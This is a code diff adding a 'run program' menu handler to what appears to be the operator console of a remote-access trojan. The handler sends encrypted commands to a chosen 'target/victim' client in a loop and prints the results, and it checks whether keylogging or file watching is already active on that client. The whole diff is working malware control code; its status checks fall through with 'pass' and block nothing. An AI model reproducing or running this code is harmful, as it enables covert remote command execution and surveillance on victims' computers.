@@ -5101,3 +5101,90 @@ def perform_menu_item_15(sockets_to_read: list, connected_clients: dict, shared_
 
     print(constants.RETURN_MAIN_MENU_MSG)
     print(constants.MENU_CLOSING_BANNER)
+
+
+def perform_menu_item_8(connected_clients: dict, shared_secret: bytes):
+    print(constants.START_RUN_PROGRAM_MSG)
+
+    # CASE 1: Check if client list is empty
+    if len(connected_clients) == constants.ZERO:
+        print(constants.GET_KEYLOG_FILE_NO_CLIENTS_ERROR)
+
+    # CASE 2: Handle single client in client list
+    if len(connected_clients) == constants.CLIENT_LIST_INITIAL_SIZE:
+        client_socket, (client_ip, client_port, status, status_2) = next(iter(connected_clients.items()))
+
+        # Check status
+        if is_keylogging(status, client_ip, client_port, constants.GET_KEYLOG_FILE_KEYLOG_TRUE_ERROR):
+            print(constants.RETURN_MAIN_MENU_MSG)
+            print(constants.MENU_CLOSING_BANNER)
+            pass
+            # return None
+        elif is_watching(status_2, client_ip, client_port, constants.WATCH_STATUS_TRUE_ERROR):
+            print(constants.RETURN_MAIN_MENU_MSG)
+            print(constants.MENU_CLOSING_BANNER)
+            pass
+            # return None
+        else:
+            # Send signal to target/victim
+            client_socket.send(encrypt_string(constants.RUN_PROGRAM_SIGNAL, shared_secret).encode())
+
+            while True:
+                # Get command from user
+                command = input(constants.GET_USER_PROMPT_MSG)
+                if command.lower() == constants.EXIT_RUN_PROGRAM_SIGNAL:
+                    client_socket.send(encrypt_string(command, shared_secret).encode())
+                    print(constants.RETURN_MAIN_MENU_MSG)
+                    print(constants.MENU_CLOSING_BANNER)
+                    break
+
+                # Send command to target/victim
+                client_socket.send(encrypt_string(command, shared_secret).encode())
+
+                # Receive and print the result from the client
+                result = decrypt_string(client_socket.recv(4096).decode(), shared_secret)
+                print(result)
+
+    # CASE 3: Multiple Clients Handler
+    elif len(connected_clients) != constants.ZERO:
+        target_ip = input(constants.ENTER_TARGET_IP_FIND_PROMPT)
+        target_port = int(input(constants.ENTER_TARGET_PORT_FIND_PROMPT))
+        target_socket, target_ip, target_port, status, status_2 = find_specific_client_socket(
+            connected_clients,
+            target_ip,
+            target_port)
+
+        # Check if target socket is currently running keylogger
+        if is_keylogging(status, target_ip, target_port, constants.FILE_TRANSFER_KEYLOG_TRUE_ERROR):
+            print(constants.RETURN_MAIN_MENU_MSG)
+            print(constants.MENU_CLOSING_BANNER)
+            pass
+
+        # Check if file/directory watching
+        if is_watching(status_2, target_ip, target_port, constants.WATCH_STATUS_TRUE_ERROR):
+            print(constants.RETURN_MAIN_MENU_MSG)
+            print(constants.MENU_CLOSING_BANNER)
+            pass
+
+        if target_socket:
+            # Send signal to target/victim
+            target_socket.send(encrypt_string(constants.RUN_PROGRAM_SIGNAL, shared_secret).encode())
+
+            while True:
+                # Get command from user
+                command = input(constants.GET_USER_PROMPT_MSG)
+                if command.lower() == constants.EXIT_RUN_PROGRAM_SIGNAL:
+                    target_socket.send(encrypt_string(command, shared_secret).encode())
+                    print(constants.RETURN_MAIN_MENU_MSG)
+                    print(constants.MENU_CLOSING_BANNER)
+                    break
+
+                # Send command to target/victim
+                target_socket.send(encrypt_string(command, shared_secret).encode())
+
+                # Receive and print the result from the client
+                result = decrypt_string(target_socket.recv(4096).decode(), shared_secret)
+                print(result)
+
+    print(constants.RETURN_MAIN_MENU_MSG)
+    print(constants.MENU_CLOSING_BANNER)
